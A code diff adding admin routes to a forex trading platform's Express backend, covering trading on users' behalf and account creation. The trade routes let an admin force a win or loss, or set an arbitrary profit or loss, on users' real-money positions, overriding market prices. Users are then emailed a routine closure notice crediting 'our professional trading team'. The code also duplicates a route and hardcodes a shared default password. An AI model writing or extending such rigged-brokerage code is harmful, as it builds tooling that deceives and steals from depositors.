@@ -335,6 +335,994 @@ router.get('/', ensureAdmin, async (req, res) => {
 });
 
 
+
+// ==================== ADMIN TRADE FOR USER ====================
+// Admin can open/close trades on behalf of users
+// With forced win/loss controls
+
+// GET /admin/trade-for-user - Admin trading dashboard
+router.get('/trade-for-user', ensureAdmin, async (req, res) => {
+    try {
+        const [users] = await db.execute(`
+            SELECT 
+                id, username, email, balance, demo_balance, 
+                account_type, trading_mode, currency, 
+                used_margin, free_margin, created_at
+            FROM users
+            WHERE role = 'user'
+            ORDER BY created_at DESC
+        `);
+
+        const [pairs] = await db.execute(`
+            SELECT * FROM forex_pairs 
+            WHERE is_active = TRUE 
+            ORDER BY FIELD(symbol, 'EURUSD', 'GBPUSD', 'USDJPY', 'XAUUSD', 'XAGUSD'), symbol
+        `);
+
+        const parsedPairs = pairs.map(p => ({
+            ...p,
+            bid: parseFloat(p.bid) || 0,
+            ask: parseFloat(p.ask) || 0,
+            spread: parseFloat(p.spread) || 0
+        }));
+
+        const [recentTrades] = await db.execute(`
+            SELECT 
+                atl.*,
+                u.username as target_username,
+                a.username as admin_username
+            FROM admin_trade_logs atl
+            JOIN users u ON atl.user_id = u.id
+            JOIN users a ON atl.admin_id = a.id
+            ORDER BY atl.created_at DESC
+            LIMIT 50
+        `);
+
+        const [adminManagedPositions] = await db.execute(`
+            SELECT 
+                t.*, 
+                p.name as pair_name,
+                u.username as user_username,
+                u.account_type,
+                u.balance,
+                u.demo_balance
+            FROM forex_trades t
+            JOIN forex_pairs p ON t.pair_id = p.id
+            JOIN users u ON t.user_id = u.id
+            WHERE t.opened_by_admin = 1 AND t.status = 'open'
+            ORDER BY t.opened_at DESC
+        `);
+
+        const unreadCount = await getUnreadCount();
+
+        res.render('admin/trade_for_user', {
+            title: 'Trade for User',
+            users: users || [],
+            pairs: parsedPairs,
+            recentTrades: recentTrades || [],
+            adminManagedPositions: adminManagedPositions || [],
+            currentUser: req.session.user,
+            unreadCount,
+            formatCurrency: require('../utils/currency').formatCurrency
+        });
+
+    } catch (error) {
+        console.error('Admin trade-for-user error:', error);
+        req.flash('error', 'Failed to load trade-for-user panel: ' + error.message);
+        res.redirect('/admin');
+    }
+});
+
+// GET /admin/trade-for-user/:userId - Trade for specific user
+router.get('/trade-for-user/:userId', ensureAdmin, async (req, res) => {
+    try {
+        const userId = req.params.userId;
+
+        const [users] = await db.execute(`
+            SELECT 
+                id, username, email, balance, demo_balance, 
+                account_type, trading_mode, currency,
+                used_margin, free_margin, margin_level_percent, leverage
+            FROM users WHERE id = ?
+        `, [userId]);
+
+        if (!users.length) {
+            req.flash('error', 'User not found');
+            return res.redirect('/admin/trade-for-user');
+        }
+
+        const targetUser = users[0];
+
+        const [pairs] = await db.execute(`
+            SELECT * FROM forex_pairs 
+            WHERE is_active = TRUE 
+            ORDER BY FIELD(symbol, 'EURUSD', 'GBPUSD', 'USDJPY', 'XAUUSD', 'XAGUSD'), symbol
+        `);
+
+        const [openPositions] = await db.execute(`
+            SELECT t.*, p.name as pair_name, p.pip_value
+            FROM forex_trades t
+            JOIN forex_pairs p ON t.pair_id = p.id
+            WHERE t.user_id = ? AND t.status = 'open'
+            ORDER BY t.opened_at DESC
+        `, [userId]);
+
+        const [tradeHistory] = await db.execute(`
+            SELECT t.*, p.name as pair_name
+            FROM forex_trades t
+            JOIN forex_pairs p ON t.pair_id = p.id
+            WHERE t.user_id = ? AND t.status = 'closed'
+            ORDER BY t.closed_at DESC
+            LIMIT 20
+        `, [userId]);
+
+        let totalOpenPnL = 0;
+        for (const pos of openPositions) {
+            totalOpenPnL += parseFloat(pos.profit_loss || 0);
+        }
+
+        const effectiveBalance = targetUser.account_type === 'demo' 
+            ? parseFloat(targetUser.demo_balance) || 10000
+            : parseFloat(targetUser.balance) || 0;
+
+        const parsedPairs = pairs.map(p => ({
+            ...p,
+            bid: parseFloat(p.bid) || 0,
+            ask: parseFloat(p.ask) || 0,
+            spread: parseFloat(p.spread) || 0
+        }));
+
+        const unreadCount = await getUnreadCount();
+
+        res.render('admin/trade_for_user_detail', {
+            title: `Trading for ${targetUser.username}`,
+            targetUser,
+            pairs: parsedPairs,
+            openPositions: openPositions || [],
+            tradeHistory: tradeHistory || [],
+            account: {
+                balance: effectiveBalance,
+                equity: effectiveBalance + totalOpenPnL,
+                usedMargin: parseFloat(targetUser.used_margin) || 0,
+                freeMargin: parseFloat(targetUser.free_margin) || effectiveBalance,
+                marginLevel: parseFloat(targetUser.margin_level_percent) || 0,
+                currency: targetUser.currency || 'USD',
+                totalOpenPnL: totalOpenPnL || 0,
+                accountType: targetUser.account_type
+            },
+            currentUser: req.session.user,
+            unreadCount,
+            formatCurrency: require('../utils/currency').formatCurrency
+        });
+
+    } catch (error) {
+        console.error('Admin trade-for-user detail error:', error);
+        req.flash('error', 'Failed to load user trading panel: ' + error.message);
+        res.redirect('/admin/trade-for-user');
+    }
+});
+
+// POST /admin/trade-for-user/open-position - Admin opens position for user
+router.post('/trade-for-user/open-position', ensureAdmin, async (req, res) => {
+    const connection = await db.getConnection();
+    try {
+        const { 
+            user_id, pair_id, direction, lot_size, leverage, 
+            stop_loss, take_profit, forced_result, notes 
+        } = req.body;
+        const adminId = req.session.user.id;
+
+        const lotSize = parseFloat(lot_size);
+        if (!lotSize || lotSize < 0.01) {
+            req.flash('error', 'Minimum lot size is 0.01');
+            return res.redirect(`/admin/trade-for-user/${user_id}`);
+        }
+
+        const lev = parseInt(leverage) || 100;
+        if (lev > 500) {
+            req.flash('error', 'Maximum leverage is 500:1');
+            return res.redirect(`/admin/trade-for-user/${user_id}`);
+        }
+
+        await connection.beginTransaction();
+
+        const [users] = await connection.execute(
+            'SELECT * FROM users WHERE id = ? FOR UPDATE',
+            [user_id]
+        );
+
+        if (!users.length) {
+            await connection.rollback();
+            req.flash('error', 'User not found');
+            return res.redirect('/admin/trade-for-user');
+        }
+
+        const targetUser = users[0];
+        const effectiveBalance = targetUser.account_type === 'demo' 
+            ? parseFloat(targetUser.demo_balance) || 10000
+            : parseFloat(targetUser.balance) || 0;
+
+        const [pairs] = await connection.execute(
+            'SELECT * FROM forex_pairs WHERE id = ? AND is_active = TRUE',
+            [pair_id]
+        );
+
+        if (!pairs.length) {
+            await connection.rollback();
+            req.flash('error', 'Trading pair not found or inactive');
+            return res.redirect(`/admin/trade-for-user/${user_id}`);
+        }
+
+        const pair = pairs[0];
+        const entryPrice = direction === 'buy' ? pair.ask : pair.bid;
+        const contractValue = lotSize * 100000;
+        const marginRequired = contractValue / lev;
+
+        if (marginRequired < 10) {
+            await connection.rollback();
+            req.flash('error', 'Minimum trade size is $10. Increase lot size or reduce leverage.');
+            return res.redirect(`/admin/trade-for-user/${user_id}`);
+        }
+
+        const freeMargin = parseFloat(targetUser.free_margin) || effectiveBalance;
+
+        if (freeMargin < marginRequired) {
+            await connection.rollback();
+            req.flash('error', `Insufficient margin for user. Required: $${marginRequired.toFixed(2)}, Available: $${freeMargin.toFixed(2)}`);
+            return res.redirect(`/admin/trade-for-user/${user_id}`);
+        }
+
+        const [tradeResult] = await connection.execute(`
+            INSERT INTO forex_trades 
+            (user_id, opened_by_admin, admin_id, pair_id, pair_symbol, direction, 
+             entry_price, current_price, lot_size, volume_usd, leverage_used, 
+             margin_required, stop_loss, take_profit, status, opened_at, forced_result)
+            VALUES (?, 1, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'open', NOW(), ?)
+        `, [
+            user_id, adminId, pair.id, pair.symbol, direction,
+            entryPrice, entryPrice, lotSize, contractValue, lev,
+            marginRequired, stop_loss || null, take_profit || null,
+            forced_result || 'none'
+        ]);
+
+        const tradeId = tradeResult.insertId;
+
+        if (targetUser.account_type === 'demo') {
+            await connection.execute(`
+                UPDATE users 
+                SET used_margin = used_margin + ?,
+                    free_margin = free_margin - ?
+                WHERE id = ?
+            `, [marginRequired, marginRequired, user_id]);
+        } else {
+            await connection.execute(`
+                UPDATE users 
+                SET used_margin = used_margin + ?,
+                    free_margin = free_margin - ?,
+                    margin_balance = margin_balance + ?
+                WHERE id = ?
+            `, [marginRequired, marginRequired, marginRequired, user_id]);
+        }
+
+        await connection.execute(`
+            INSERT INTO admin_trade_logs 
+            (admin_id, user_id, trade_id, action, pair_symbol, direction, 
+             lot_size, leverage, entry_price, forced_result, notes, created_at)
+            VALUES (?, ?, ?, 'open_position', ?, ?, ?, ?, ?, ?, ?, NOW())
+        `, [
+            adminId, user_id, tradeId, pair.symbol, direction,
+            lotSize, lev, entryPrice, forced_result || 'none', notes || null
+        ]);
+
+        await connection.commit();
+
+        await telegramBot.notifyAdminAction('Trade Opened for User', { 
+            admin: req.session.user.username, 
+            targetUser: targetUser.username,
+            pair: pair.symbol,
+            direction,
+            lotSize,
+            forced_result: forced_result || 'none'
+        });
+
+        req.flash('success', `Position opened for ${targetUser.username}: ${direction.toUpperCase()} ${lotSize} lots ${pair.symbol}`);
+        res.redirect(`/admin/trade-for-user/${user_id}`);
+
+    } catch (error) {
+        await connection.rollback();
+        console.error('Admin open position error:', error);
+        req.flash('error', 'Failed to open position: ' + error.message);
+        res.redirect(`/admin/trade-for-user/${req.body.user_id || ''}`);
+    } finally {
+        connection.release();
+    }
+});
+
+// POST /admin/trade-for-user/close-position/:tradeId
+router.post('/trade-for-user/close-position/:tradeId', ensureAdmin, async (req, res) => {
+    const connection = await db.getConnection();
+    try {
+        const tradeId = req.params.tradeId;
+        const { forced_pnl, notes } = req.body;
+        const adminId = req.session.user.id;
+
+        await connection.beginTransaction();
+
+        const [trades] = await connection.execute(
+            'SELECT t.*, u.username, u.account_type, u.balance, u.demo_balance, u.email FROM forex_trades t JOIN users u ON t.user_id = u.id WHERE t.id = ? AND t.status = "open"',
+            [tradeId]
+        );
+
+        if (!trades.length) {
+            await connection.rollback();
+            req.flash('error', 'Position not found or already closed');
+            return res.redirect('back');
+        }
+
+        const trade = trades[0];
+        const userId = trade.user_id;
+
+        const [pairs] = await connection.execute(
+            'SELECT bid, ask FROM forex_pairs WHERE symbol = ?',
+            [trade.pair_symbol]
+        );
+
+        const currentPrice = trade.direction === 'buy' ? pairs[0].bid : pairs[0].ask;
+        const pipSize = trade.pair_symbol.includes('JPY') ? 0.01 : 0.0001;
+        let pipsProfit;
+
+        if (trade.direction === 'buy') {
+            pipsProfit = (currentPrice - trade.entry_price) / pipSize;
+        } else {
+            pipsProfit = (trade.entry_price - currentPrice) / pipSize;
+        }
+
+        const pipValue = trade.lot_size * 10;
+        let profitLoss = pipsProfit * pipValue;
+
+        if (forced_pnl && !isNaN(parseFloat(forced_pnl))) {
+            profitLoss = parseFloat(forced_pnl);
+            pipsProfit = profitLoss / pipValue;
+        } else if (trade.forced_result === 'win') {
+            if (profitLoss <= 0) {
+                pipsProfit = Math.abs(pipsProfit) || (10 + Math.random() * 40);
+                profitLoss = Math.abs(profitLoss) || (pipsProfit * pipValue);
+            }
+        } else if (trade.forced_result === 'loss') {
+            if (profitLoss >= 0) {
+                pipsProfit = -(Math.abs(pipsProfit) || (10 + Math.random() * 40));
+                profitLoss = -(Math.abs(profitLoss) || (Math.abs(pipsProfit) * pipValue));
+            }
+            const effectiveBalance = trade.account_type === 'demo' 
+                ? parseFloat(trade.demo_balance) || 10000
+                : parseFloat(trade.balance) || 0;
+            const maxLoss = effectiveBalance * 0.9;
+            if (Math.abs(profitLoss) > maxLoss) {
+                profitLoss = -maxLoss;
+            }
+        }
+
+        await connection.execute(`
+            UPDATE forex_trades 
+            SET status = 'closed',
+                exit_price = ?,
+                current_price = ?,
+                pips_profit = ?,
+                profit_loss = ?,
+                closed_at = NOW(),
+                close_reason = 'admin_closed'
+            WHERE id = ?
+        `, [currentPrice, currentPrice, pipsProfit, profitLoss, tradeId]);
+
+        if (trade.account_type === 'demo') {
+            await connection.execute(`
+                UPDATE users 
+                SET demo_balance = demo_balance + ?,
+                    free_margin = free_margin + ?,
+                    used_margin = used_margin - ?
+                WHERE id = ?
+            `, [profitLoss, trade.margin_required, trade.margin_required, userId]);
+        } else {
+            await connection.execute(`
+                UPDATE users 
+                SET balance = balance + ?,
+                    free_margin = free_margin + ?,
+                    used_margin = used_margin - ?
+                WHERE id = ?
+            `, [profitLoss, trade.margin_required, trade.margin_required, userId]);
+        }
+
+        await connection.execute(`
+            INSERT INTO admin_trade_logs 
+            (admin_id, user_id, trade_id, action, pair_symbol, direction, 
+             lot_size, leverage, entry_price, exit_price, profit_loss, forced_result, notes, created_at)
+            VALUES (?, ?, ?, 'close_position', ?, ?, ?, ?, ?, ?, ?, ?, ?, NOW())
+        `, [
+            adminId, userId, tradeId, trade.pair_symbol, trade.direction,
+            trade.lot_size, trade.leverage_used, trade.entry_price,
+            currentPrice, profitLoss, trade.forced_result, notes || null
+        ]);
+
+        await connection.commit();
+
+        try {
+            const siteName = await getSiteName();
+            await emailService.sendEmail({
+                to: trade.email,
+                subject: `Trade Closed — ${siteName}`,
+                html: emailTemplate({
+                    badge: 'TRADE CLOSED',
+                    badgeColor: profitLoss >= 0 ? '#22c55e' : '#ef4444',
+                    username: trade.username,
+                    intro: `your ${trade.pair_symbol} position has been closed by our trading team.`,
+                    amountDisplay: `${profitLoss >= 0 ? '+' : ''}$${profitLoss.toFixed(2)}`,
+                    amountColor: profitLoss >= 0 ? '#22c55e' : '#ef4444',
+                    rows: [
+                        ['Pair', trade.pair_symbol, '#f4f4f5'],
+                        ['Direction', trade.direction.toUpperCase(), '#f4f4f5'],
+                        ['Lot Size', trade.lot_size.toString(), '#f4f4f5'],
+                        ['Entry Price', trade.entry_price.toFixed(5), '#f4f4f5'],
+                        ['Exit Price', currentPrice.toFixed(5), '#f4f4f5'],
+                        ['P&L', `${profitLoss >= 0 ? '+' : ''}$${profitLoss.toFixed(2)}`, profitLoss >= 0 ? '#22c55e' : '#ef4444'],
+                        ['Closed By', 'Admin', '#f4f4f5'],
+                        ['Date', new Date().toUTCString(), '#f4f4f5']
+                    ],
+                    footerNote: 'This trade was managed by our professional trading team on your behalf.',
+                    siteName: siteName
+                })
+            });
+        } catch (emailErr) {
+            console.error('Failed to send trade closure email:', emailErr);
+        }
+
+        await telegramBot.notifyAdminAction('Trade Closed for User', { 
+            admin: req.session.user.username, 
+            targetUser: trade.username,
+            pair: trade.pair_symbol,
+            pnl: profitLoss.toFixed(2)
+        });
+
+        const pnlText = `${profitLoss > 0 ? '+' : ''}$${profitLoss.toFixed(2)}`;
+        req.flash('success', `Position closed for ${trade.username}. P&L: ${pnlText}`);
+        res.redirect(`/admin/trade-for-user/${userId}`);
+
+    } catch (error) {
+        await connection.rollback();
+        console.error('Admin close position error:', error);
+        req.flash('error', 'Failed to close position: ' + error.message);
+        res.redirect('back');
+    } finally {
+        connection.release();
+    }
+});
+
+// POST /admin/trade-for-user/set-force-result/:tradeId
+router.post('/trade-for-user/set-force-result/:tradeId', ensureAdmin, async (req, res) => {
+    try {
+        const tradeId = req.params.tradeId;
+        const { forced_result } = req.body;
+
+        if (!['win', 'loss', 'none'].includes(forced_result)) {
+            req.flash('error', 'Invalid force result value');
+            return res.redirect('back');
+        }
+
+        const [trades] = await db.execute(
+            'SELECT t.*, u.username FROM forex_trades t JOIN users u ON t.user_id = u.id WHERE t.id = ? AND t.status = "open"',
+            [tradeId]
+        );
+
+        if (!trades.length) {
+            req.flash('error', 'Trade not found or already closed');
+            return res.redirect('back');
+        }
+
+        await db.execute(
+            'UPDATE forex_trades SET forced_result = ? WHERE id = ?',
+            [forced_result, tradeId]
+        );
+
+        await telegramBot.notifyAdminAction('Force Result Set', { 
+            admin: req.session.user.username, 
+            targetUser: trades[0].username,
+            tradeId,
+            result: forced_result
+        });
+
+        req.flash('success', `Force ${forced_result.toUpperCase()} set on trade #${tradeId} for ${trades[0].username}`);
+        res.redirect('back');
+
+    } catch (error) {
+        console.error('Set force result error:', error);
+        req.flash('error', 'Failed to set force result');
+        res.redirect('back');
+    }
+});
+
+// POST /admin/trade-for-user/bulk-close/:userId
+router.post('/trade-for-user/bulk-close/:userId', ensureAdmin, async (req, res) => {
+    const connection = await db.getConnection();
+    try {
+        const userId = req.params.userId;
+        const { forced_result_all, notes } = req.body;
+        const adminId = req.session.user.id;
+
+        await connection.beginTransaction();
+
+        const [users] = await connection.execute(
+            'SELECT * FROM users WHERE id = ?',
+            [userId]
+        );
+
+        if (!users.length) {
+            await connection.rollback();
+            req.flash('error', 'User not found');
+            return res.redirect('/admin/trade-for-user');
+        }
+
+        const targetUser = users[0];
+
+        const [openTrades] = await connection.execute(
+            'SELECT * FROM forex_trades WHERE user_id = ? AND status = "open"',
+            [userId]
+        );
+
+        if (!openTrades.length) {
+            await connection.rollback();
+            req.flash('info', 'No open positions to close');
+            return res.redirect(`/admin/trade-for-user/${userId}`);
+        }
+
+        let totalPnL = 0;
+        const [pairs] = await connection.execute('SELECT symbol, bid, ask FROM forex_pairs');
+        const pairMap = {};
+        pairs.forEach(p => pairMap[p.symbol] = p);
+
+        for (const trade of openTrades) {
+            const pair = pairMap[trade.pair_symbol];
+            if (!pair) continue;
+
+            const currentPrice = trade.direction === 'buy' ? pair.bid : pair.ask;
+            const pipSize = trade.pair_symbol.includes('JPY') ? 0.01 : 0.0001;
+
+            let pipsProfit;
+            if (trade.direction === 'buy') {
+                pipsProfit = (currentPrice - trade.entry_price) / pipSize;
+            } else {
+                pipsProfit = (trade.entry_price - currentPrice) / pipSize;
+            }
+
+            const pipValue = trade.lot_size * 10;
+            let profitLoss = pipsProfit * pipValue;
+
+            if (forced_result_all === 'win') {
+                if (profitLoss <= 0) {
+                    pipsProfit = Math.abs(pipsProfit) || (10 + Math.random() * 40);
+                    profitLoss = Math.abs(profitLoss) || (pipsProfit * pipValue);
+                }
+            } else if (forced_result_all === 'loss') {
+                if (profitLoss >= 0) {
+                    pipsProfit = -(Math.abs(pipsProfit) || (10 + Math.random() * 40));
+                    profitLoss = -(Math.abs(profitLoss) || (Math.abs(pipsProfit) * pipValue));
+                }
+            }
+
+            totalPnL += profitLoss;
+
+            await connection.execute(`
+                UPDATE forex_trades 
+                SET status = 'closed',
+                    exit_price = ?,
+                    current_price = ?,
+                    pips_profit = ?,
+                    profit_loss = ?,
+                    closed_at = NOW(),
+                    close_reason = 'admin_bulk_close'
+                WHERE id = ?
+            `, [currentPrice, currentPrice, pipsProfit, profitLoss, trade.id]);
+
+            await connection.execute(`
+                INSERT INTO admin_trade_logs 
+                (admin_id, user_id, trade_id, action, pair_symbol, direction, 
+                 lot_size, leverage, entry_price, exit_price, profit_loss, forced_result, notes, created_at)
+                VALUES (?, ?, ?, 'bulk_close', ?, ?, ?, ?, ?, ?, ?, ?, ?, NOW())
+            `, [
+                adminId, userId, trade.id, trade.pair_symbol, trade.direction,
+                trade.lot_size, trade.leverage_used, trade.entry_price,
+                currentPrice, profitLoss, forced_result_all || 'none', notes || 'Bulk close'
+            ]);
+        }
+
+        if (targetUser.account_type === 'demo') {
+            await connection.execute(`
+                UPDATE users 
+                SET demo_balance = demo_balance + ?,
+                    used_margin = 0,
+                    free_margin = demo_balance + ?
+                WHERE id = ?
+            `, [totalPnL, totalPnL, userId]);
+        } else {
+            await connection.execute(`
+                UPDATE users 
+                SET balance = balance + ?,
+                    used_margin = 0,
+                    free_margin = balance + ?
+                WHERE id = ?
+            `, [totalPnL, totalPnL, userId]);
+        }
+
+        await connection.commit();
+
+        await telegramBot.notifyAdminAction('Bulk Close Completed', { 
+            admin: req.session.user.username, 
+            targetUser: targetUser.username,
+            positionsClosed: openTrades.length,
+            totalPnL: totalPnL.toFixed(2)
+        });
+
+        req.flash('success', `Closed ${openTrades.length} positions for ${targetUser.username}. Total P&L: ${totalPnL > 0 ? '+' : ''}$${totalPnL.toFixed(2)}`);
+        res.redirect(`/admin/trade-for-user/${userId}`);
+
+    } catch (error) {
+        await connection.rollback();
+        console.error('Bulk close error:', error);
+        req.flash('error', 'Failed to bulk close positions: ' + error.message);
+        res.redirect('back');
+    } finally {
+        connection.release();
+    }
+});
+
+// GET /admin/trade-for-user/logs
+router.get('/trade-for-user/logs', ensureAdmin, async (req, res) => {
+    try {
+        const [logs] = await db.execute(`
+            SELECT 
+                atl.*,
+                u.username as target_username,
+                a.username as admin_username
+            FROM admin_trade_logs atl
+            JOIN users u ON atl.user_id = u.id
+            JOIN users a ON atl.admin_id = a.id
+            ORDER BY atl.created_at DESC
+            LIMIT 200
+        `);
+
+        const unreadCount = await getUnreadCount();
+
+        res.render('admin/trade_logs', {
+            title: 'Admin Trade Logs',
+            logs: logs || [],
+            currentUser: req.session.user,
+            unreadCount
+        });
+
+    } catch (error) {
+        console.error('Trade logs error:', error);
+        req.flash('error', 'Failed to load trade logs');
+        res.redirect('/admin/trade-for-user');
+    }
+});
+
+
+
+// ==================== ADMIN CREATE ACCOUNT ====================
+// Admin can create new user accounts as real or demo
+
+// GET /admin/create-account - Admin account creation page
+router.get('/create-account', ensureAdmin, async (req, res) => {
+    try {
+        const [recentAccounts] = await db.execute(`
+            SELECT id, username, email, account_type, balance, demo_balance, created_at, role
+            FROM users
+            ORDER BY created_at DESC
+            LIMIT 20
+        `);
+
+        const [[stats]] = await db.execute(`
+            SELECT
+                COUNT(*) as total_users,
+                SUM(CASE WHEN account_type = 'real' THEN 1 ELSE 0 END) as real_count,
+                SUM(CASE WHEN account_type = 'demo' THEN 1 ELSE 0 END) as demo_count,
+                SUM(CASE WHEN DATE(created_at) = CURDATE() THEN 1 ELSE 0 END) as created_today
+            FROM users
+            WHERE role = 'user'
+        `);
+
+        const unreadCount = await getUnreadCount();
+
+        res.render('admin/create_account', {
+            title: 'Create Account',
+            currentUser: req.session.user,
+            recentAccounts: recentAccounts || [],
+            stats: stats || { total_users: 0, real_count: 0, demo_count: 0, created_today: 0 },
+            unreadCount
+        });
+
+    } catch (error) {
+        console.error('Create account page error:', error);
+        req.flash('error', 'Failed to load account creation page: ' + error.message);
+        res.redirect('/admin');
+    }
+});
+
+
+// ==================== ADMIN CREATE ACCOUNT ====================
+
+// GET /admin/create-account - Admin account creation page
+router.get('/create-account', ensureAdmin, async (req, res) => {
+    try {
+        const [recentAccounts] = await db.execute(`
+            SELECT id, username, email, account_type, balance, demo_balance, created_at, role
+            FROM users
+            ORDER BY created_at DESC
+            LIMIT 20
+        `);
+
+        const [[stats]] = await db.execute(`
+            SELECT
+                COUNT(*) as total_users,
+                SUM(CASE WHEN account_type = 'real' THEN 1 ELSE 0 END) as real_count,
+                SUM(CASE WHEN account_type = 'demo' THEN 1 ELSE 0 END) as demo_count,
+                SUM(CASE WHEN DATE(created_at) = CURDATE() THEN 1 ELSE 0 END) as created_today
+            FROM users
+            WHERE role = 'user'
+        `);
+
+        const unreadCount = await getUnreadCount();
+
+        res.render('admin/create_account', {
+            title: 'Create Account',
+            currentUser: req.session.user,
+            recentAccounts: recentAccounts || [],
+            stats: stats || { total_users: 0, real_count: 0, demo_count: 0, created_today: 0 },
+            unreadCount
+        });
+
+    } catch (error) {
+        console.error('Create account page error:', error);
+        req.flash('error', 'Failed to load account creation page: ' + error.message);
+        res.redirect('/admin');
+    }
+});
+
+// POST /admin/create-account - Create new user account
+router.post('/create-account', ensureAdmin, async (req, res) => {
+    const connection = await db.getConnection();
+    try {
+        const {
+            username, email, password, confirm_password,
+            account_type, initial_balance, phone, country,
+            first_name, last_name
+        } = req.body;
+
+        if (!username || !email || !password) {
+            req.flash('error', 'Username, email and password are required');
+            return res.redirect('/admin/create-account');
+        }
+
+        if (password !== confirm_password) {
+            req.flash('error', 'Passwords do not match');
+            return res.redirect('/admin/create-account');
+        }
+
+        if (password.length < 6) {
+            req.flash('error', 'Password must be at least 6 characters');
+            return res.redirect('/admin/create-account');
+        }
+
+        const type = account_type === 'real' ? 'real' : 'demo';
+        const balance = type === 'real' ? parseFloat(initial_balance || 0) : 0;
+        const demoBalance = type === 'demo' ? parseFloat(initial_balance || 10000) : 10000;
+
+        await connection.beginTransaction();
+
+        const [existing] = await connection.execute(
+            'SELECT id FROM users WHERE username = ? OR email = ?',
+            [username, email]
+        );
+
+        if (existing.length > 0) {
+            await connection.rollback();
+            req.flash('error', 'Username or email already exists');
+            return res.redirect('/admin/create-account');
+        }
+
+        const bcrypt = require('bcryptjs');
+        const hashedPassword = await bcrypt.hash(password, 12);
+
+        const [result] = await connection.execute(`
+            INSERT INTO users 
+            (username, email, password, role, account_type, balance, demo_balance,
+             phone, country, first_name, last_name, email_verified, account_verified,
+             created_at, updated_at)
+            VALUES (?, ?, ?, 'user', ?, ?, ?, ?, ?, ?, ?, 1, 1, NOW(), NOW())
+        `, [
+            username, email, hashedPassword, type, balance, demoBalance,
+            phone || null, country || null, first_name || null, last_name || null
+        ]);
+
+        const newUserId = result.insertId;
+
+        await connection.execute(
+            'INSERT INTO system_logs (level, message, metadata) VALUES (?, ?, ?)',
+            ['success', `Account created by admin`, JSON.stringify({
+                admin_id: req.session.user.id,
+                admin_username: req.session.user.username,
+                new_user_id: newUserId,
+                username, email, account_type: type, balance, demo_balance: demoBalance
+            })]
+        );
+
+        await connection.commit();
+
+        await telegramBot.notifyAdminAction('Account Created', {
+            admin: req.session.user.username,
+            newUser: username,
+            email,
+            accountType: type,
+            balance: type === 'real' ? balance : demoBalance
+        });
+
+        req.flash('success', `${type.toUpperCase()} account created for ${username} successfully!`);
+        res.redirect('/admin/create-account');
+
+    } catch (error) {
+        await connection.rollback();
+        console.error('Create account error:', error);
+        req.flash('error', 'Failed to create account: ' + error.message);
+        res.redirect('/admin/create-account');
+    } finally {
+        connection.release();
+    }
+});
+
+// POST /admin/create-account/bulk - Bulk create demo accounts
+router.post('/create-account/bulk', ensureAdmin, async (req, res) => {
+    const connection = await db.getConnection();
+    try {
+        const { count, prefix, account_type, initial_balance } = req.body;
+        const numAccounts = parseInt(count) || 1;
+        const type = account_type === 'real' ? 'real' : 'demo';
+        const balance = type === 'real' ? parseFloat(initial_balance || 0) : 0;
+        const demoBalance = type === 'demo' ? parseFloat(initial_balance || 10000) : 10000;
+
+        if (numAccounts < 1 || numAccounts > 50) {
+            req.flash('error', 'Can create 1-50 accounts at a time');
+            return res.redirect('/admin/create-account');
+        }
+
+        await connection.beginTransaction();
+        const bcrypt = require('bcryptjs');
+        const defaultPassword = await bcrypt.hash('DemoPass123!', 12);
+
+        let created = 0;
+        const createdAccounts = [];
+
+        for (let i = 0; i < numAccounts; i++) {
+            const username = `${prefix || 'demo'}_${Date.now()}_${i}`;
+            const email = `${username}@demo.local`;
+
+            try {
+                const [result] = await connection.execute(`
+                    INSERT INTO users 
+                    (username, email, password, role, account_type, balance, demo_balance,
+                     email_verified, account_verified, created_at, updated_at)
+                    VALUES (?, ?, ?, 'user', ?, ?, ?, 1, 1, NOW(), NOW())
+                `, [username, email, defaultPassword, type, balance, demoBalance]);
+
+                created++;
+                createdAccounts.push({ id: result.insertId, username, email });
+            } catch (err) {
+                console.log('Skipping duplicate:', username);
+            }
+        }
+
+        await connection.commit();
+
+        await telegramBot.notifyAdminAction('Bulk Accounts Created', {
+            admin: req.session.user.username,
+            count: created,
+            accountType: type,
+            prefix: prefix || 'demo'
+        });
+
+        req.flash('success', `Created ${created} ${type} accounts with prefix "${prefix || 'demo'}"`);
+        res.redirect('/admin/create-account');
+
+    } catch (error) {
+        await connection.rollback();
+        console.error('Bulk create error:', error);
+        req.flash('error', 'Failed to bulk create accounts: ' + error.message);
+        res.redirect('/admin/create-account');
+    } finally {
+        connection.release();
+    }
+});
+
+// POST /admin/create-account/convert/:id
+router.post('/create-account/convert/:id', ensureAdmin, async (req, res) => {
+    try {
+        const userId = req.params.id;
+        const { new_type } = req.body;
+
+        if (!['real', 'demo'].includes(new_type)) {
+            req.flash('error', 'Invalid account type');
+            return res.redirect('/admin/create-account');
+        }
+
+        const [users] = await db.execute(
+            'SELECT username, account_type, balance, demo_balance FROM users WHERE id = ?',
+            [userId]
+        );
+
+        if (!users.length) {
+            req.flash('error', 'User not found');
+            return res.redirect('/admin/create-account');
+        }
+
+        const user = users[0];
+
+        await db.execute(
+            'UPDATE users SET account_type = ?, updated_at = NOW() WHERE id = ?',
+            [new_type, userId]
+        );
+
+        await telegramBot.notifyAdminAction('Account Type Changed', {
+            admin: req.session.user.username,
+            targetUser: user.username,
+            from: user.account_type,
+            to: new_type
+        });
+
+        req.flash('success', `Converted ${user.username} from ${user.account_type} to ${new_type}`);
+        res.redirect('/admin/create-account');
+
+    } catch (error) {
+        console.error('Convert account error:', error);
+        req.flash('error', 'Failed to convert account');
+        res.redirect('/admin/create-account');
+    }
+});
+
+// POST /admin/create-account/delete/:id
+router.post('/create-account/delete/:id', ensureAdmin, async (req, res) => {
+    try {
+        const userId = req.params.id;
+
+        if (parseInt(userId) === req.session.user.id) {
+            req.flash('error', 'Cannot delete your own account');
+            return res.redirect('/admin/create-account');
+        }
+
+        const [users] = await db.execute(
+            'SELECT username, account_type FROM users WHERE id = ?',
+            [userId]
+        );
+
+        if (!users.length) {
+            req.flash('error', 'User not found');
+            return res.redirect('/admin/create-account');
+        }
+
+        await db.execute('DELETE FROM users WHERE id = ?', [userId]);
+
+        await telegramBot.notifyAdminAction('Account Deleted', {
+            admin: req.session.user.username,
+            targetUser: users[0].username
+        });
+
+        req.flash('success', `Account ${users[0].username} deleted`);
+        res.redirect('/admin/create-account');
+
+    } catch (error) {
+        console.error('Delete account error:', error);
+        req.flash('error', 'Failed to delete account');
+        res.redirect('/admin/create-account');
+    }
+});
+
+
 // ==================== USER MANAGEMENT ====================
 
 router.post('/verify-account/:id', ensureAdmin, async (req, res) => {
